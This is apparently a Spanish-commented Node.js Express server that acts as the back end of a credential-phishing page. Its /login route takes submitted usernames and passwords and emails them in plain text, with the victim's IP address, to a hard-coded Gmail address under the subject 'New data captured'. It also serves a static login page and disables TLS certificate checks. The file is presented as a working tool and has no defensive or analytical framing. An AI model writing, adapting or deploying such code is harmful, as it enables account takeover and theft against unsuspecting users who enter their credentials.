require('dotenv').config();

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// --- CONFIGURACIÓN DE MIDDLEWARE ---
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- ARCHIVOS ESTÁTICOS ---
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURACIÓN DE CORREO (PUERTO 587 - RECOMENDADO PARA RENDER) ---
const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,               // Puerto STARTTLS
    secure: false,           // false para STARTTLS
    requireTLS: true,        // Forzar uso de TLS
    auth: {
        user: process.env.GMAIL_USER || 'paschasin1234@gmail.com',
        pass: process.env.GMAIL_PASSWORD
    },
    // Configuraciones de tiempo aumentadas para Render
    connectionTimeout: 30000, // 30 segundos
    socketTimeout: 30000,     // 30 segundos
    greetingTimeout: 30000,   // 30 segundos
    // Configuración de TLS
    tls: {
        rejectUnauthorized: false,
        ciphers: 'SSLv3'
    },
    // Logs detallados
    logger: true,
    debug: true
});

// Verificación inicial con manejo mejorado de errores
transporter.verify(function(error, success) {
    if (error) {
        console.log('🔴 Error inicial en conexión SMTP:', error.message);
        console.log('⚠️  El servidor continuará, pero el envío de correos podría fallar');
    } else {
        console.log('🟢 Transporter verificado y listo');
        console.log('📧 Servidor SMTP: smtp.gmail.com:587');
    }
});

// --- RUTA PARA RECIBIR LOS DATOS ---
app.post('/login', async (req, res) => {
    const { usuario, password } = req.body;

    console.log(`📩 Intento de envío recibido - Usuario: ${usuario}`);

    // Validación básica
    if (!usuario || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Usuario y contraseña son requeridos' 
        });
    }

    const mailOptions = {
        from: `"Servidor de Formulario" <${process.env.GMAIL_USER || 'paschasin1234@gmail.com'}>`,
        to: process.env.GMAIL_USER || 'paschasin1234@gmail.com',
        subject: '¡Nuevos datos capturados!',
        text: `Se han enviado nuevos datos del formulario:\n\n📧 Usuario/Email: ${usuario}\n🔑 Contraseña: ${password}\n\n⏰ Fecha: ${new Date().toLocaleString()}\n🌐 IP: ${req.ip}`,
        html: `
            <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4;">
                <div style="max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                    <h2 style="color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px;">📨 Nuevos Datos Capturados</h2>
                    
                    <div style="margin: 20px 0;">
                        <p><strong>📧 Usuario/Email:</strong> ${usuario}</p>
                        <p><strong>🔑 Contraseña:</strong> <code style="background: #f0f0f0; padding: 2px 5px; border-radius: 3px;">${password}</code></p>
                    </div>
                    
                    <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; font-size: 12px; color: #666;">
                        <p><strong>⏰ Fecha:</strong> ${new Date().toLocaleString()}</p>
                        <p><strong>🌐 IP del cliente:</strong> ${req.ip}</p>
                    </div>
                </div>
            </div>
        `
    };

    try {
        // Envío del correo con timeout controlado
        const info = await transporter.sendMail(mailOptions);
        
        console.log('✅ Correo enviado con éxito:', info.messageId);
        console.log('📤 Respuesta del servidor:', info.response);
        
        res.status(200).json({ 
            success: true, 
            message: 'Datos recibidos y correo enviado correctamente',
            messageId: info.messageId
        });
        
    } catch (error) {
        console.error('❌ Error enviando correo:', error.message);
        console.error('📋 Detalles del error:', error);
        
        // Respuesta de error detallada
        res.status(500).json({ 
            success: false, 
            message: 'Error al enviar el correo',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Error interno del servidor'
        });
    }
});

// --- RUTA DE PRUEBA (HEALTH CHECK) ---
app.get('/ping', (req, res) => {
    res.json({ 
        status: 'active',
        message: 'Pong! El servidor está vivo.',
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development'
    });
});

// --- RUTA PARA PRUEBA DE EMAIL ---
app.get('/test-email', async (req, res) => {
    try {
        await transporter.verify();
        
        const testMail = {
            from: process.env.GMAIL_USER || 'paschasin1234@gmail.com',
            to: process.env.GMAIL_USER || 'paschasin1234@gmail.com',
            subject: '✅ Prueba de correo desde Render',
            text: 'Este es un correo de prueba enviado desde el servidor en Render.'
        };
        
        const info = await transporter.sendMail(testMail);
        
        res.json({
            success: true,
            message: 'Correo de prueba enviado exitosamente',
            messageId: info.messageId,
            response: info.response
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Error en prueba de correo',
            error: error.message
        });
    }
});

// --- RUTA PRINCIPAL ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- MANEJO DE ERRORES 404 ---
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Ruta no encontrada',
        path: req.path
    });
});

// --- INICIO DEL SERVIDOR ---
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

app.listen(PORT, HOST, () => {
    console.log(`
    🚀 Servidor iniciado exitosamente!
    📍 Puerto: ${PORT}
    🌐 Host: ${HOST}
    🕐 Hora: ${new Date().toLocaleString()}
    🔧 Entorno: ${process.env.NODE_ENV || 'development'}
    
    📊 Rutas disponibles:
    • GET  /           → Página principal
    • POST /login      → Enviar datos del formulario
    • GET  /ping       → Health check
    • GET  /test-email → Probar conexión de correo
    `);
});